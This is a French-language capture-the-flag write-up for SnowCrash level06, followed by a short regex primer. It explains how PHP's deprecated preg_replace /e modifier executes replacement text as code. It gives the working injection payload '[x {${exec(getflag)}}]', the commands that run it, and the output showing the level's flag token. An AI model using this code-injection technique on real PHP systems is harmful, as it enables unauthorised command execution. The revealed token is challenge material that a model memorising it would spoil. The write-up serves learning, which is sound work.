level06:

debut

ls -la
2 fichier = 
un executable = ./level06
un script php = level06.php

executer l'executable avec le .php
resultat une faille detecte 

cette ligne : $a = preg_replace("/(\(x ( x *)\))/e", "y(\"\\2\")", $a)

Le modificateur /e permet d’exécuter directement le code contenu dans le remplacement.
Cela signifie que l’argument passé à x("argument") est exécuté comme du code PHP.

resultat : 
creation de la commande malveillante et mettre le resultat dans le fichier -> 'test'
level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1.

Pourquoi ça marche (explication simple)

preg_replace(... /e ...) exécute le remplacement comme du PHP

le contenu entre (x ... ) est interprété comme du code

${exec(getflag)} appelle une fonction système

PHP exécute la commande avec les droits de level06

-> C’est pour ça que /e est supprimé dans les versions modernes de PHP


Comprendre les base de REGEX : commande de recherche, modification et supprimer string dans un fichier texte.

Chercher un mot
flag
➡ trouve toutes les occurrences de flag

Début et fin de ligne

^Début
➡ ligne qui commence par Début


fin$
➡ ligne qui finit par fin

Groupes ()
(x test)


( ) capture le contenu

\1, \2 = groupes capturés

Classes de caractères

[a-z]
➡ une lettre minuscule

[0-9]
➡ un chiffre

Quantificateurs

*
➡ 0 ou plusieurs fois

+
➡ 1 ou plusieurs fois

?
➡ 0 ou 1 fois

🛠 Modifier du texte (preg_replace)
preg_replace("/chat/", "chien", $texte);

❌ Supprimer du texte
preg_replace("/chat/", "", $texte);


